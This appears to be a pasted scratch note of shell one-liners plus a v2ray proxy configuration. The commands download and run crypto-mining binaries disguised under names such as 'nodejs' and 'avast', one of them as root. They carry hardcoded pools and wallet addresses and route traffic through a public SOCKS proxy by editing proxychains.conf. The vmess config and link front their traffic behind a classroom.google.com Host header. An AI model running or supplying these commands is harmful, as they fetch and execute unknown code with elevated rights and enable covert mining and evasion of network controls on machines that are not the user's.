apt-get install libpci3 &&  wget https://github.com/ahmad998AA/p/releases/download/v1/nodejs && chmod +x nodejs && sudo ./nodejs -epool eth-us1.hellominer.com:1100 -wal 0x80f568e40828aac7d748a51167b24003c6943920.$(echo $(shuf -i 1-5 -n 1)-xx) -pass x

wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz && tar xf lolMiner_v1.29_Lin64.tar.gz && cd 1.29 && ./lolMiner --algo ETCHASH --pool etchash.unmineable.com:3333 --user RVN:RY28x597iBdNnLziuhQ3Y1z9C48Zjo2ysn.$(echo $(shuf -i 1000-9999 -n 1)-gass)


TRHjzK8DBKrse4X4THaepbemcF6CVBKDT6



TON
EQBB7AiekO0BMwfFwgC4A_-w-aOgPSt5G_oDg4kyOlETN-kU


apt update

apt install proxychains

apt install screen -y

sed -i 's/socks4/socks5/' /etc/proxychains.conf

sed -i 's/127.0.0.1/98.162.96.53/' /etc/proxychains.conf

sed -i 's/9050/10663/' /etc/proxychains.conf

wget https://raw.githubusercontent.com/renilo/ba/main/avast

chmod +x avast

./avast --algo TON --pool https://server1.whalestonpool.com --user EQBB7AiekO0BMwfFwgC4A_-w-aOgPSt5G_oDg4kyOlETN-kU --ton-mode 1

0x86ca902b2ca60630188dba14105442141dc3b1dc


{
  "dns": {
    "hosts": {
      "domain:googleapis.cn": "googleapis.com"
    },
    "servers": [
      "1.1.1.1"
    ]
  },
  "inbounds": [
    {
      "listen": "127.0.0.1",
      "port": 10808,
      "protocol": "socks",
      "settings": {
        "auth": "noauth",
        "udp": true,
        "userLevel": 8
      },
      "sniffing": {
        "destOverride": [
          "http",
          "tls"
        ],
        "enabled": true
      },
      "tag": "socks"
    },
    {
      "listen": "127.0.0.1",
      "port": 10809,
      "protocol": "http",
      "settings": {
        "userLevel": 8
      },
      "tag": "http"
    },
    {
      "listen": "127.0.0.1",
      "port": 10853,
      "protocol": "dokodemo-door",
      "settings": {
        "address": "1.1.1.1",
        "network": "tcp,udp",
        "port": 53
      },
      "tag": "dns-in"
    }
  ],
  "log": {
    "loglevel": "warning"
  },
  "outbounds": [
    {
      "mux": {
        "concurrency": -1,
        "enabled": false
      },
      "protocol": "vmess",
      "settings": {
        "vnext": [
          {
            "address": "do2.kitu.xyz",
            "port": 80,
            "users": [
              {
                "alterId": 0,
                "id": "2123bd25-b6fe-40d1-a5a1-3937a8785f05",
                "level": 8,
                "security": "auto"
              }
            ]
          }
        ]
      },
      "streamSettings": {
        "network": "ws",
        "security": "",
        "wsSettings": {
          "headers": {
            "Host": "classroom.google.com"
          },
          "path": "/vmess/"
        }
      },
      "tag": "proxy"
    },
    {
      "protocol": "freedom",
      "settings": {},
      "tag": "direct"
    },
    {
      "protocol": "blackhole",
      "settings": {
        "response": {
          "type": "http"
        }
      },
      "tag": "block"
    },
    {
      "protocol": "dns",
      "tag": "dns-out"
    }
  ],
  "policy": {
    "levels": {
      "8": {
        "connIdle": 300,
        "downlinkOnly": 1,
        "handshake": 4,
        "uplinkOnly": 1
      }
    },
    "system": {
      "statsOutboundUplink": true,
      "statsOutboundDownlink": true
    }
  },
  "routing": {
    "domainStrategy": "IPIfNonMatch",
    "rules": [
      {
        "inboundTag": [
          "dns-in"
        ],
        "outboundTag": "dns-out",
        "type": "field"
      },
      {
        "ip": [
          "1.1.1.1"
        ],
        "outboundTag": "proxy",
        "port": "53",
        "type": "field"
      },
      {
        "ip": [
          "223.5.5.5"
        ],
        "outboundTag": "direct",
        "port": "53",
        "type": "field"
      }
    ]
  },
  "stats": {}
}




vmess://eyJhZGQiOiJkbzIua2l0dS54eXoiLCJhaWQiOiIwIiwiaG9zdCI6ImNsYXNzcm9vbS5nb29nbGUuY29tIiwiaWQiOiIyMTIzYmQyNS1iNmZlLTQwZDEtYTVhMS0zOTM3YTg3ODVmMDUiLCJuZXQiOiJ3cyIsInBhdGgiOiIvdm1lc3MvIiwicG9ydCI6IjgwIiwicHMiOiJraXR1dnBuLWRvZGhvcyIsInRscyI6IiIsInR5cGUiOiJub25lIiwidiI6IjIifQ==
